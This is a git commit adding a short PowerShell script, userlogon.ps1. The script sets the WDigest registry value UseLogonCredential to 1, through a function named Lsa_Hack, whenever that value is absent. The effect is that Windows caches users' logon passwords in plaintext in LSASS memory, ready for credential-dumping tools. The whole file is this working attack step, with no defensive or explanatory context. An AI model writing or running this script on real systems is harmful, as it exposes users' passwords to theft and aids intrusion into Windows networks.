8e3985d477b456ee872e575626e2e7f92d22f5ed
GrechaM <39443257+GrechaM@users.noreply.github.com>
2018-05-26 07:57:56 +0700

    Add files via upload

---
+++ userlogon.ps1
@@ -0,0 +1,16 @@
+﻿$Path="HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest\"
+$key = "UseLogonCredential"
+Function Lsa_Hack
+{
+New-ItemProperty -Path $Path -Name $key -Type DWORD -Value 1
+}
+
+Function Test-RegistryValue($regkey, $name) {
+    $exists = Get-ItemProperty -Path "$regkey" -Name "$name" -ErrorAction SilentlyContinue
+    If (($exists -ne $null) -and ($exists.Length -ne 0)) {
+        Return $true
+    }
+    Return $false
+}
+
+if ((Test-RegistryValue $Path $key) -eq $false ) {Lsa_Hack}
